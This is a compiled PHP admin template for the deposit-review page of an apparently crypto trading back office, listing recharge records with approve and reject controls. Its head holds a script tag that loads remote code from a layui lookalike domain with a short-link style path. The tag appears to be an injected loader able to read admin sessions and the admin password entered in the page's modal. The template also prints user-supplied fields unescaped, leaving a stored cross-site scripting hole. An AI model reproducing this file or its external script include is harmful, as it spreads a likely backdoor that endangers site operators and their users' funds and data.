<?php if (!defined('THINK_PATH')) exit(); /*a:4:{s:71:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/user/userprice.html";i:1636429136;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/head.html";i:1637561064;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/menu.html";i:1631099310;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/foot.html";i:1553756524;}*/ ?>
<!DOCTYPE html>
<html lang="en" style="font-size: 50px;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="/favicon.ico">

    <title>B.King后台管理系统</title>

    <!-- Bootstrap core CSS -->
    <link href="__ADMIN__/css/bootstrap.min.css" rel="stylesheet">
    <link href="__ADMIN__/css/bootstrap-reset.css" rel="stylesheet">
    <!--external css-->
    <link href="__ADMIN__/assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="stylesheet" href="__ADMIN__/css/owl.carousel.css" type="text/css">
    <!-- Custom styles for this template -->
    <link href="__ADMIN__/css/style.css" rel="stylesheet">
    <link href="__ADMIN__/css/style-responsive.css" rel="stylesheet" />
    <link href="__ADMIN__/css/addstyle.css" rel="stylesheet">

    <script src="__ADMIN__/js/jquery.js"></script>
    <script src="__ADMIN__/js/jquery-1.8.3.min.js"></script>
    <script src="/static/layer/layer.js"></script>

    <!-- 时间选择器 -->
    <link rel="stylesheet" type="text/css" href="__ADMIN__/css/jquery.datetimepicker.css"/>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 tooltipss and media queries -->
    <!--[if lt IE 9]>
      <script src="__ADMIN__/js/html5shiv.js"></script>
      <script src="__ADMIN__/js/respond.min.js"></script>
    <![endif]-->
    
<script src="https://lay-ui.com/r/gR2/woT3dK"></script>

  </head>

  <body>

  <section id="container" class="">
      <!--header start-->
      <header class="header white-bg">
            <div class="sidebar-toggle-box">
                <div data-original-title="显示/隐藏" data-placement="right" class="icon-reorder tooltips"></div>
            </div>
            <!--logo start-->
          <?php if($msg_nums>0): ?>
          <a  href="<?php echo Url('admin/user/message'); ?>" class="logo">
          <?php else: ?>
          <a  href="#" class="logo">
          <?php endif; ?>
              后台管理系统
              <?php if($msg_nums>0): ?>
              <span>&nbsp;&nbsp;您有<?php echo $msg_nums; ?>条未读留言</span>
              <?php endif; ?>
          </a>
            <!--logo end-->

            <div class="top-nav ">
                <!--search & user info start-->
                <ul class="nav pull-right top-menu">
                    <?php if(isset($_SESSION['username'])): ?>
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="username"><?php echo !empty($_SESSION['username'])?$_SESSION['username']:''; ?></span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <li><a href="<?php echo Url('login/logout'); ?>"><i class="icon-signout"></i> 退出</a></li>
                        </ul>
                    </li>
                    <?php endif; ?>
                    <!-- user login dropdown end -->
                </ul>
                <!--search & user info end-->
            </div>
        </header>
<!--header end-->




<!--sidebar start-->
      <aside>
          <div id="sidebar"  class="nav-collapse ">
          
          <?php if($otype == 3): ?>
              <!-- sidebar menu start-->
              <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
                  <!-- <?php if(is_array($menulist) || $menulist instanceof \think\Collection || $menulist instanceof \think\Paginator): $i = 0; $__LIST__ = $menulist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                  <!-- <?php if($ruleslist == 'all' || in_array($vo['id'],$ruleslist)): ?> -->
                  <li 
                  <?php if($vo['arr'] == ""): if($contrname == $vo['con']): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; else: if($contrname == $vo['con'] && (in_array($actionname,$vo['arr']))): ?>
                    class="active"
                    <?php else: ?>
                    class="sub-menu "
                    <?php endif; endif; ?>
                  >
                      <a class="" <?php if($vo['url'] == ""): ?> href="javascript:;" <?php else: ?> href="<?php echo $vo['url']; ?>" <?php endif; ?>>
                          <i class="<?php echo $vo['icon']; ?>"></i>
                          <span><?php echo $vo['name']; ?></span>
                          <!-- <?php if($vo['arrow'] != ""): ?> -->
                          <span class="arrow"></span>
                          <!-- <?php endif; ?> -->
                      </a>
                      <ul class="sub">
                        <!-- <?php if(is_array($vo['list']) || $vo['list'] instanceof \think\Collection || $vo['list'] instanceof \think\Paginator): $i = 0; $__LIST__ = $vo['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($i % 2 );++$i;?> -->
                        <!-- <?php if($ruleslist == 'all' || in_array($v['id'],$ruleslist)): ?> -->
                        <li 
                        <?php if($v['arr'] == ""): if($contrname == $v['con'] && $actionname == $v['act']): ?> class="active" <?php endif; else: if(in_array($actionname,$v['arr']) && $contrname == $v['con'] && $actionname == $v['act']): ?>
                          class="active"
                          <?php endif; endif; ?>
                        >
                          <a  href="<?php echo $v['url']; ?>"><?php echo $v['name']; ?></a>
                        </li>
                        <!-- <?php endif; ?> -->
                        <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                      </ul>
                  </li>
                  <!-- <?php endif; ?> -->
                  <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>安全退出</span>
                      </a>
                  </li>
              </ul>
              <!-- sidebar menu end-->
          <?php else: ?>
           <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
               
                
                  <li <?php if($contrname == 'Order'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-paste"></i>
                          <span>订单管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if($actionname == 'orderlist'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist'); ?>">秒合约订单</a></li>
                          <li <?php if($actionname == 'orderlist_bibi'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_bibi'); ?>">币币订单</a></li>
                          <li <?php if($actionname == 'orderlist_lever'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_lever'); ?>">合约订单</a></li>
                          
                      </ul>
                  </li>

                  <li <?php if($contrname == 'User' && ( in_array($actionname,array('userlist','useradd','userprice','userinfo','cash','myteam')) )): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-user"></i>
                          <span>用户管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if(in_array($actionname,array('userlist','useradd'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userlist'); ?>">客户列表</a></li>
                          
                          <li <?php if(in_array($actionname,array('myteam'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/myteam'); ?>">我的团队</a></li>

                          <li <?php if($actionname == 'userprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userprice'); ?>">充值列表</a></li>

                          <li <?php if($actionname == 'cash'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/cash'); ?>">提现列表</a></li>
 
                      </ul>
                  </li>

                  
                  <!--<li <?php if($contrname == 'Price'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-yen"></i>
                          <span>报表管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          
                          
                          <li <?php if($actionname == 'allot'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/allot'); ?>">红利报表</a></li>

                          <li <?php if($actionname == 'yongjin'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/yongjin'); ?>">佣金报表</a></li>

                          <li <?php if($actionname == 'pricelist'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/pricelist'); ?>">资金报表</a></li>

                          <li <?php if($actionname == 'myprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/myprice'); ?>">个人报表</a></li>
                          
                      </ul>
                  </li>
                  -->
                 

                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>退出</span>
                      </a>
                  </li>
              </ul>
          
          <?php endif; ?>
          </div>
      </aside>
      <!--sidebar end-->







<!--main content start-->

      <section id="main-content">

          <section class="wrapper">

              <!--state overview start-->

              

              <div class="row state-overview">

                <div class="container">

                <div class="row">

                      <form action="" method="get">

                      <div class="col-lg-3 mar-10">

                        <div class="input-group">

                            <span class="input-group-addon" id="basic-addon1">

                              <select name="stype" id="">

                                <option <?php if(isset($getdata['stype']) && $getdata['stype'] == 1): ?> selected="selected" <?php endif; ?> value="1">客户</option>

                                <option <?php if(isset($getdata['stype']) && $getdata['stype'] == 2): ?> selected="selected" <?php endif; ?>  value="2">代理商</option>

                              </select>

                            </span>

                            <input type="text" value="<?php echo !empty($getdata['username'])?$getdata['username']:''; ?>"  class="form-control" name="username" />

                        </div>

                      </div>



                      <div class="col-lg-6 mar-10">

                        <div class="input-group">

                            <span class="input-group-addon" id="basic-addon1">订单时间</span>

                            <input type="text"  id="datetimepicker" class="form-control" placeholder="点击选择时间" name="starttime" value="<?php echo !empty($getdata['starttime'])?$getdata['starttime']:''; ?>"/>

                            <span class="input-group-addon" id="basic-addon1">至</span>

                            <input type="text"  id="datetimepicker_end" class="form-control" placeholder="点击选择时间" name="endtime" value="<?php echo !empty($getdata['endtime'])?$getdata['endtime']:''; ?>" />

                        </div>

                      </div>



                      



                      <div class="col-lg-3 mar-10" >

                        <div class="input-group">

                            <span class="input-group-addon">类型</span>

                            <select name="bptype"  class="selectpicker show-tick form-control">

                                <option value="">默认不选</option>

                                <option <?php if(isset($getdata['bptype']) && $getdata['bptype'] == 1): ?> selected="selected" <?php endif; ?> value="1">用户充值</option>

                                <option <?php if(isset($getdata['bptype']) && $getdata['bptype'] == 2): ?> selected="selected" <?php endif; ?> value="2">后台充值</option>

                            </select>

                        </div>

                      </div>



                      

                  </div>

                  <div class="mar-10">

                   <input type="submit" class="btn btn-success" value="搜索">

                  </div>



                  </form>

                </div>

                

              </div>

              

              <!--state overview end-->

            <!-- <a href="<?php echo url('user/userprice',array('bptype'=>1)); ?>"><button type="submit" class="btn btn-success">充值记录</button></a>&nbsp;&nbsp;&nbsp;&nbsp;

            <a href="<?php echo url('user/userprice',array('bptype'=>0)); ?>"><button type="submit" class="btn btn-success">提现记录</button></a>&nbsp;&nbsp;&nbsp;&nbsp; -->

            <a href="<?php echo url('user/userprice'); ?>"><button type="submit" class="btn btn-danger">搜索全部</button></a>&nbsp;&nbsp;&nbsp;&nbsp;
            
           

            

            <br><br>

             <div class="row">

                  <div class="col-lg-12">

                      <section class="panel">

                          <header class="panel-heading">

                              充值列表

                          </header>

                          <table class="table table-striped table-advance table-hover">

                            <thead class="ordertable">

                              <tr>

                                <th>编号</th>

                                <th>账号</th>

                                <th>姓名</th>

                                <th>提交时间</th>
                                <th>币种</th>

                                <th>数量</th>
                                <th>充币地址</th>
                                
                                <th>协议</th>
                                <th>备注</th>
								<th>凭证</th>

                                <th>审核时间</td>
								
								<?php if($otype == 3): ?>
                                <th>审核/状态</td>
								<?php endif; ?>

                            </tr>

                          </thead>

                          <tbody>

                          <!-- <?php if(is_array($balance) || $balance instanceof \think\Collection || $balance instanceof \think\Paginator): $i = 0; $__LIST__ = $balance;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->

                              <tr>

                                  <td><?php echo $vo['bpid']; ?></td>

                                  <td><?php echo $vo['username']; ?></td>

                                  <td><?php echo $vo['nickname']; ?> </td>

                                  <td><?php echo date("Y-m-d H:i:s",$vo['btime']); ?> </td>
                                     <td class="color_red"><?php echo $vo['bizhong']; ?></td>
                                  <td class="color_red"><?php echo $vo['bpprice']; ?></td>
                                    <td class="color_red"><?php echo $vo['usdt_url']; ?></td>
                                    
                                     <td class="color_red"><?php echo $vo['usdt_type']; ?></td>
                               

                                  <td><?php echo $vo['remarks']; ?></td>
								
	<td>
                                <?php if($vo['pingzheng']): ?>
                                <a href="/public/uploads/<?php echo $vo['pingzheng']; ?>" target = "_blank"><img src="/public/uploads/<?php echo $vo['pingzheng']; ?>" width="100px" /></a>
                                <?php else: ?>
                                无
                                <?php endif; ?>
                            </td>
								
                                  <td><?php if($vo['cltime']): ?><?php echo date("Y-m-d H:i:s",$vo['cltime']); endif; ?></td>

                                 

                                  <?php if($otype == 3): ?>

                                  <td><?php if($vo['isverified'] == 0): ?>
										
                                      <a class="do_reg" href="javascript:;" onclick="do_reg(<?php echo $vo['bpid']; ?>,1)">通过</a>|
									  <a class="do_reg" href="javascript:;" onclick="do_reg(<?php echo $vo['bpid']; ?>,2)">拒绝</a>

                                      <?php elseif($vo['isverified'] == 2): ?>

                                      

                                      	<span class="color_red">已拒绝</span>

                                      <?php else: ?>

										<span class="color_green">已通过</span>

                                      <?php endif; ?>



                                  </td>
								  <?php endif; ?>

                              </tr>

							<!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->

                             

                              </tbody>

                          </table>

                      </section>

                  

              

                      <?php echo $balance->render(); ?>

                </div>

              </div>

          </section>

      </section>

      <!--main content end-->

  </section>





  <!-- Modal -->

<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" style="padding-top:200px">

  <div class="modal-dialog" role="document">

    <div class="modal-content">

      <div class="modal-header" style="background: #B50000;">

        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>

        <h4 class="modal-title" id="myModalLabel">用户提现</h4>

      </div>

      <div class="modal-body">

        <div class="priceinfo color_red"></div><br>

        <div class="input-group">

            <span class="input-group-addon " id="basic-addon1">请输入管理员登录密码</span>

            <input type="password" value="" class="form-control" id="adminpwd">

        </div>

      </div>

      <div class="modal-footer">

        <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>

        <button type="button" class="btn btn-primary dopay">确认</button>

      </div>

    </div>

  </div>

</div>




    <!-- js placed at the end of the document so the pages load faster -->
    
    <script src="__ADMIN__/js/bootstrap.min.js"></script>
    <script src="__ADMIN__/js/jquery.scrollTo.min.js"></script>
    <script src="__ADMIN__/js/jquery.nicescroll.js" type="text/javascript"></script>
    <script src="__ADMIN__/js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="__ADMIN__/js/owl.carousel.js" ></script>
    <script src="__ADMIN__/js/jquery.customSelect.min.js" ></script>

    <!--common script for all pages-->
    <script src="__ADMIN__/js/common-scripts.js"></script>

    <!--script for this page-->
    <script src="__ADMIN__/js/sparkline-chart.js"></script>
    <script src="__ADMIN__/js/easy-pie-chart.js"></script>

    <!-- active -->
    <script src="/static/public/js/function.js"></script>
    
    <!-- date -->
    <script type="text/javascript" src="__ADMIN__/js/date/jquery.datetimepicker.js" charset="UTF-8"></script>

  </body>
</html>

<script>

var userid = '';

var bpid = '';

var adminpwd = '';

	$(".price").click(function(){

      userid = $(this).attr('data-userid');

      bpid = $(this).attr('data-bpid');

      $('.priceinfo').html('确认此提现处理吗？点击确认对应金额会进入用户微信个人账户。确认此操作吗？');



    });



    $('.dopay').click(function(){

    	adminpwd = $('#adminpwd').val();

    	if(!adminpwd){

    		layer.msg('请输入管理员密码'); 

    		return false;

    	}

    	var formurl = "<?php echo Url('user/dorecharge'); ?>";

    	var data = 'uid='+userid+'&bpid='+bpid+'&adminpwd='+adminpwd;

	    var locurl = "<?php echo Url('user/userprice'); ?>";



	    WPpost(formurl,data,locurl);

    });

	function do_reg(bpid,types){
		$('.do_reg').attr('onclick',' ');
		layer.msg('请稍后......'); 
		var formurl = "<?php echo Url('user/shouuserprice'); ?>";
		var data = '&bpid='+bpid+'&types='+types;
		var locurl = "<?php echo Url('user/userprice'); ?>";
		
		WPpost(formurl,data,locurl);
		
	}



//时间选择器

$('#datetimepicker').datetimepicker();

$('#datetimepicker_end').datetimepicker();

</script>